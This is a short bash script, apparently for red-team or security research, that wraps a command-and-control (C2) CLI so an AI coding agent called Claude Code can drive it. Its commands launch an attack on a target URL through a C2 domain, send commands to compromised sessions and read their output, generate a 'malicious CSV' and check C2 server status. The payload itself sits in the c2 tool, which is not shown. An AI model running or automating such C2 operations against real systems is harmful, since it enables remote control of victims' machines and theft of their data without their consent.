#!/bin/bash
# C2 Automation Script for Claude Code
# This script wraps the c2 CLI commands for easier automation

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../../../.." && pwd)"
ATTACKER_DIR="$PROJECT_ROOT/attacker-infra"

# Source environment
cd "$ATTACKER_DIR"
if [ -f set_env_vars.sh ]; then
    source set_env_vars.sh
fi

ACTION="${1:-help}"
shift || true

case "$ACTION" in
    attack)
        # Launch attack against target
        TARGET="$1"
        if [ -z "$TARGET" ]; then
            echo "Usage: c2.sh attack <target_url>"
            exit 1
        fi
        uv run c2 attack "$TARGET" --c2-domain "${DOMAIN:-c2.bt-research-control.com}"
        ;;

    send)
        # Send command to session
        COMMAND="$1"
        SESSION="$2"
        if [ -z "$COMMAND" ] || [ -z "$SESSION" ]; then
            echo "Usage: c2.sh send <command> <session_id>"
            exit 1
        fi
        uv run c2 send "$COMMAND" --session "$SESSION"
        ;;

    receive)
        # Receive output from session
        SESSION="$1"
        if [ -z "$SESSION" ]; then
            echo "Usage: c2.sh receive <session_id>"
            exit 1
        fi
        uv run c2 receive --session "$SESSION"
        ;;

    generate)
        # Generate malicious CSV
        uv run c2 generate-csv "$@"
        ;;

    status)
        # Check C2 server status
        uv run c2 status
        ;;

    help|*)
        echo "C2 Automation Script"
        echo ""
        echo "Usage: c2.sh <action> [args]"
        echo ""
        echo "Actions:"
        echo "  attack <url>           Launch attack against target URL"
        echo "  send <cmd> <session>   Send command to session"
        echo "  receive <session>      Receive output from session"
        echo "  generate               Generate malicious CSV"
        echo "  status                 Check C2 server status"
        echo ""
        ;;
esac
